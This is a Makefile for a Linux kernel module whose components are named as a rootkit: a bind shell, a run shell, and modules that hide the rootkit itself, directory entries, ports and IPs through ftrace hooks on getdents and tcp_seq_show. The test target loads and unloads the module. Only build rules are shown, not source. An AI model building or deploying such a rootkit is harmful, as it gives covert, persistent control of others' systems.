obj-m += project.o
project-objs += rootkit/main.o rootkit/connector.o rootkit/mods/bindshell.o rootkit/mods/runshell.o rootkit/mods/hideme.o rootkit/mods/hidedent.o rootkit/mods/hideport.o rootkit/mods/hideip.o rootkit/hooker/ftrace_helper.o rootkit/hooker/getdents.o rootkit/hooker/tcp_seq_show.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
test:
	sudo dmesg -C
	sudo insmod project.ko
	sudo rmmod project.ko
	sudo dmesg
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
